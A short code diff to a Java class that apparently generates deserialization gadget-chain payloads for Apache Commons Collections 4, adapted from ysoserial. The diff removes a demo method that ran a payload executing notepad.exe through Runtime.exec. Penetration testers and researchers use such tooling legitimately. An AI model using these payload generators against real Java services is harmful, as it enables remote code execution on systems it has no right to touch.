@@ -18,10 +18,6 @@ import java.util.Set;
 // based on pop chain in https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java (converted for CC4)
 
 public class CommonsCollectionsFourPayload implements ScriptEngineEvaluator {
-    public static void main(String... args) {
-        Util.deserialize(new CommonsCollectionsFourPayload().generateJavaScriptPayload("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");"));
-    }
-
     @Override
     public byte[] generateScriptPayload(String scriptText, String scriptType) {
         Transformer<Object, Class<ScriptEngineManager>> conTr = ConstantTransformer.constantTransformer(ScriptEngineManager.class);
